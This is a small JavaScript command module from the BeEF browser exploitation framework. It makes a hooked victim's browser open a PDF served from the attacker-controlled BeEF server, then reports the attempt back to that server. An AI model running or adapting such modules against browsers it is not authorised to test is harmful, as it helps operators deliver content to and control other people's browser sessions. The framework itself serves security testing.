//
// Copyright (c) 2006-2024 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
	
	var pdf_url =  beef.net.httpproto + '://'+beef.net.host+ ':' + beef.net.port + '/report.pdf';
	window.open( pdf_url, '_blank');

    beef.net.send('<%= @command_url %>', <%= @command_id %>, "Attempted to open PDF in default browser.");
});
